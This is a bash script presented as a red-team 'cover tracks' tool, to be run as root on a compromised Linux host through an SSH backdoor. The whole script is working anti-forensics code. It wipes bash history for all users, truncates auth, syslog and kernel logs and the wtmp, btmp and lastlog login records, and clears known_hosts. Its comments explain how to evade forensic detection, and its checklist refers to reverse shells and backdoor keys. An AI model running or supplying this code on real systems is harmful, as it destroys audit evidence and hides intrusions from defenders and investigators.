#!/bin/bash

# =======================================================
#   IRTx Red Team - Cover Tracks Script
#   Author: DataTrust Red Team
#   Description: Clears logs, history and activity traces
#                on a compromised target host.
#   Run from: INSIDE the compromised target via SSH
#   Usage: sudo bash cover_tracks.sh
# =======================================================

# --- Colours ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "   ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ "
echo "  ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗"
echo "  ██║     ██║   ██║██║   ██║█████╗  ██████╔╝"
echo "  ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗"
echo "  ╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║"
echo "   ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝"
echo -e "${RED}  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝"
echo "     ██║   ██████╔╝███████║██║     █████╔╝ ███████╗"
echo "     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║"
echo "     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║"
echo -e "     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝${RESET}"
echo -e "${CYAN}        IRTx Red Team — Cover Tracks Script${RESET}"
echo -e "${YELLOW}        DataTrust Security Consultants${RESET}"
echo ""

# --- Critical OPSEC reminder ---
echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${YELLOW}  ║  OPSEC REMINDER — IMPORTANT:                        ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  This script must be run ON THE TARGET MACHINE      ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  via your SSH backdoor — NOT on your Kali machine.  ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║                                                      ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Use SPACE before ALL manual commands you type       ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  so they are excluded from bash history.             ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Example:  [SPACE]cat /etc/passwd                   ║${RESET}"
echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════════╝${RESET}"
echo ""

# --- Confirm this is intentional ---
echo -e "${RED}[!] WARNING: This will permanently delete logs on this system.${RESET}"
echo -e "${YELLOW}[?] Are you sure you want to proceed? (yes/no):${RESET}"
read -r CONFIRM
if [[ "$CONFIRM" != "yes" ]]; then
    echo -e "${CYAN}[*] Aborted. No changes made.${RESET}"
    exit 0
fi
echo ""

# --- Root check ---
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root. Use sudo.${RESET}"
    exit 1
fi

# --- Track what was cleared ---
CLEARED=()
FAILED=()

# Helper: truncate a file (safer than deleting — deletion is itself suspicious)
truncate_file() {
    local filepath=$1
    if [ -f "$filepath" ]; then
        truncate -s 0 "$filepath" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "  ${GREEN}[+] Cleared : $filepath${RESET}"
            CLEARED+=("$filepath")
        else
            echo -e "  ${RED}[!] Failed  : $filepath (permission denied?)${RESET}"
            FAILED+=("$filepath")
        fi
    else
        echo -e "  ${CYAN}[~] Skipped : $filepath (does not exist)${RESET}"
    fi
}

# =======================================================
# STEP 1: CLEAR BASH HISTORY (current session + saved)
# history -c  : clears in-memory history for this session
# truncate    : wipes the saved history file on disk
# HISTFILE=   : disables further history saving
# =======================================================
echo -e "${MAGENTA}[>] Step 1: Clearing Bash History ...${RESET}"
echo ""

history -c 2>/dev/null
echo -e "  ${GREEN}[+] In-memory session history cleared.${RESET}"

# Clear history for all users we can access
for HIST_FILE in /root/.bash_history /home/*/.bash_history; do
    truncate_file "$HIST_FILE"
done

# Disable history logging for remainder of this session
export HISTFILE=/dev/null
export HISTSIZE=0
echo -e "  ${GREEN}[+] History logging disabled for current session.${RESET}"
echo ""

# =======================================================
# STEP 2: CLEAR SYSTEM AUTH & SECURITY LOGS
# Truncating rather than deleting — deletion leaves an
# obvious gap in the filesystem that forensics will catch.
# =======================================================
echo -e "${MAGENTA}[>] Step 2: Clearing System Logs ...${RESET}"
echo ""

LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/auth.log.1"
    "/var/log/syslog"
    "/var/log/syslog.1"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/kern.log"
    "/var/log/daemon.log"
    "/var/log/debug"
    "/var/log/faillog"
)

for log in "${LOG_FILES[@]}"; do
    truncate_file "$log"
done
echo ""

# =======================================================
# STEP 3: CLEAR LOGIN RECORDS
# wtmp  : records all logins and logouts
# btmp  : records failed login attempts
# lastlog: records last login per user
# These are binary files — truncate, don't delete.
# =======================================================
echo -e "${MAGENTA}[>] Step 3: Clearing Login Records ...${RESET}"
echo ""

truncate_file "/var/log/wtmp"
truncate_file "/var/log/btmp"
truncate_file "/var/log/lastlog"
echo ""

# =======================================================
# STEP 4: CLEAR SSH LOGS & KNOWN HOSTS
# Removes evidence of our SSH backdoor connection
# from the target's own SSH records.
# =======================================================
echo -e "${MAGENTA}[>] Step 4: Clearing SSH Traces ...${RESET}"
echo ""

truncate_file "/var/log/auth.log"

# Remove our Kali machine from target's known_hosts
for KNOWN in /root/.ssh/known_hosts /home/*/.ssh/known_hosts; do
    truncate_file "$KNOWN"
done

echo ""

# =======================================================
# STEP 5: MANUAL OPSEC CHECKLIST
# Things the script cannot automate — operator must
# verify these manually before disconnecting.
# =======================================================
echo -e "${MAGENTA}[>] Step 5: Manual OPSEC Checklist${RESET}"
echo ""
echo -e "${BOLD}${YELLOW}  The following must be verified MANUALLY before exiting:${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove any files you uploaded or created on this system"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove any netcat listeners or reverse shells still running"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Remove your public key from ~/.ssh/authorized_keys if persistence is no longer needed"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Check running processes — kill anything you started: ${CYAN}ps aux${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Check cron jobs you may have added: ${CYAN}crontab -l${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Verify no temp files remain in /tmp: ${CYAN}ls -la /tmp${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} Confirm bash history is empty before exiting: ${CYAN}history${RESET}"
echo ""

# =======================================================
# FINAL SUMMARY
# =======================================================
echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${GREEN}  Track Covering Complete!${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${GREEN}Files cleared : ${#CLEARED[@]}${RESET}"
echo -e "  ${RED}Files failed  : ${#FAILED[@]}${RESET}"

if [ ${#FAILED[@]} -gt 0 ]; then
    echo ""
    echo -e "  ${YELLOW}Failed files (may need manual clearing):${RESET}"
    for f in "${FAILED[@]}"; do
        echo -e "    ${RED}► $f${RESET}"
    done
fi

echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${BOLD}${YELLOW}  FINAL OPSEC REMINDERS:${RESET}"
echo -e "${YELLOW}  ► Type: ${CYAN}history -c && exit${YELLOW} as your LAST command when done${RESET}"
echo -e "${YELLOW}  ► Do NOT forget the space before that command${RESET}"
echo -e "${YELLOW}  ► Complete the manual checklist above before disconnecting${RESET}"
echo ""

exit 0
